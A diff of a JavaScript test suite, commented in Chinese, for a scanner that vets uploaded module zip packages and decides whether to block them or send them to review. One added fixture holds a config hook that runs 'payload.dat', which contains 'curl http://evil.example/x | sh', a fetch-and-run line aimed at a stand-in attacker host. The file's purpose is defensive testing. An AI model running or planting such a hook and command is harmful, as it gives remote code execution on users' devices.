   // (b) 要保护的性质：payload.dat 内容无规则命中，整包唯一的发现就是那条引用 —— 撤销它就是整包哑掉。
   const pin = scanZip(makeModuleZip({
@@ -3024,9 +3167,17 @@ test('反 P11 撤销钉：名单外文本今天不进扫描面，且扩面撤销
   assert.equal(exec[0].severity, 'high', '执行一个名字像数据的包内条目必须是 high');
   assert.deepEqual([exec[0].file, exec[0].line], ['service.sh', 2], JSON.stringify(exec[0]));
   assert.equal(pin.findings.length, 1, 'payload.dat 无规则命中：这条引用就是整包唯一的发现');
-  assert.ok(pin.escalated.length > 0, 'escalated 证人不能跟着发现一起没');
-  assert.deepEqual(pin.escalated.map((e) => [e.fromFile, e.fromLine, e.resolvedEntry]),
-    [['service.sh', 2, 'payload.dat']], JSON.stringify(pin.escalated));
+  // 证人换了落点，不是丢了：载荷已经在 feed 上被逐行读过，所以
+  //   * escalated 必须是空 —— escalated 只记「原本不在扫描面、因引用被拉进来的条目」，
+  //     为已在面上的条目记一笔就是假账；
+  //   * revokedBundledRefs 也必须是空 —— covered 判在扩面之前的五个桶上，这条撤销没有发生，
+  //     没发生过的事不许写进撤销记录。
+  assert.ok(pin.scripts.some((s) => s.name === 'payload.dat'),
+    '载荷必须真被逐行读过（这才是「读过」的证据）：' + JSON.stringify(pin.scripts.map((s) => s.name)));
+  assert.deepEqual(pin.escalated, [],
+    'payload.dat 本来就在 feed 上：没有升级证人，是记法变了，不是证人没了');
+  assert.deepEqual(pin.revokedBundledRefs, [],
+    '撤销没有发生：记录里一笔都不许有（有就等于把「读过即无罪」又写回扫描面）');
   assert.notEqual(pin.decision.action, 'auto-approve',
     '首次收录正是「撤销一旦成立就放行」落到的那一档 —— 这条线不许被任何扫描面改动推开');
 });
@@ -3095,9 +3246,14 @@ test('fix8-E 反证：payload.dat 那一格撤销并未发生，记录里不能�
   assert.equal(exec[0].severity, 'high', '这条仍是 high —— E 不靠改等级闭洞');
   assert.equal(r.riskLevel, 'high', JSON.stringify(r.counts));
   assert.equal(r.decision.action, 'block');
-  assert.equal(r.escalated.length, 1, '载荷被拉进扫描面：那是「真读过」的证人，与撤销记录是两回事');
-  assert.deepEqual(r.escalated.map((e) => [e.fromFile, e.fromLine, e.resolvedEntry]),
-    [['service.sh', 2, 'payload.dat']], JSON.stringify(r.escalated));
+  // Task 2.7（fix10-P11）换了这里 instrument 的对象，主张一字没动：
+  // 「撤销没有发生 ⇒ 记录里不许有一笔」。发生过的读取代价现在落在 feed 上（载荷被逐行扫过），
+  // 而不是落在 escalated 上 —— 后者只记「原本不在扫描面、因引用被拉进来的条目」，
+  // 给已经在面上的条目记一笔就是假账。所以两条都必须是空，且都要被钉住。
+  assert.deepEqual(r.escalated, [],
+    'payload.dat 本来就在 feed 上：没有升级可记。证人换成下面两条 —— 它真被读了，且那条 high 还在');
+  assert.ok(r.scripts.some((s) => s.name === 'payload.dat'),
+    '载荷必须被逐行扫过（这才是「读过」的证据）：' + JSON.stringify(r.scripts.map((s) => s.name)));
   assert.equal(r.revokedBundledRefs.length, 0,
     '没撤销过的事不许写进撤销记录 —— 反证：记录必须只说发生过的事');
 });
@@ -3211,4 +3367,33 @@ test('fix8-E：EXEC_INDIRECT 的撤销在同一条 net 里（变量钉成包内 
   assert.equal(r.revokedBundledRefs[0].resolvedEntry, 'payload.js');
   assert.equal(r.decision.action, 'request-review');
   assert.ok(r.decision.reason.includes('payload.js'), r.decision.reason);
+});
+
+// ---------------------------------------------------------------------------
+// Task 2.7（fix10-P11）探针：三个集合不许写成同一个
+// ---------------------------------------------------------------------------
+// 洞（2026-10-14 在 BASE `75b76ca` 上重新实测，母本同形状）：
+// 引用方（config.json）与被引用的载荷（payload.dat）**都不像脚本**时，两者都落在
+// SCAN_TARGET_BUCKETS 之外 —— 于是「引用扫描」看不见这条引用，内容扫描也没读过那个载荷，
+// 整包 0 发现 / low / auto-approve：这条闸对投稿者自己挑的两个名字同时静默。
+//
+// 闭法是把一个集合拆成三个（判据 2 与 3 混用的后果 = 同一条 finding 出现两次，
+// 它会直接写进公开评论的「命中统计」）：
+//   1. feed（内容扫谁）   = 五个桶 ∪ cls.others ∪ 升级条目；
+//   2. covered（能撤吗）  = **只有五个桶**（扩面之前）；
+//   3. 去重（别推第二遍） = 跟着 feed，不跟着 covered。
+// 三条断言一条不多 —— 它们各自钉住上面三行里的一行。
+test('Task 2.7 探针：引用方与载荷都在名单外的包，不许走自动通道、证人要在、finding 不许重复', () => {
+  const r = scanZip(makeModuleZip({
+    id: 'eval.p10probe2',
+    files: [
+      ['module.prop', moduleProp('eval.p10probe2')],
+      ['config.json', '{ "hook": "sh $MODDIR/payload.dat" }\n'],
+      ['payload.dat', '#!/system/bin/sh\ncurl http://evil.example/x | sh\n'],
+    ],
+  }), { changeType: 'first', index: { modules: [] } });
+  const keys = r.findings.map((x) => `${x.ruleId}@${x.file}:${x.line}`);
+  assert.notEqual(r.decision.action, 'auto-approve', '引用方与载荷都不像脚本的包，不许走自动通道');
+  assert.ok(keys.includes('EXEC_BUNDLED_FILE@config.json:1'), '证人必须指名是哪个文件在调用它');
+  assert.equal(new Set(keys).size, keys.length, '同一条 finding 不许出现两次（feed 与 covered 混用的后果）');
 });
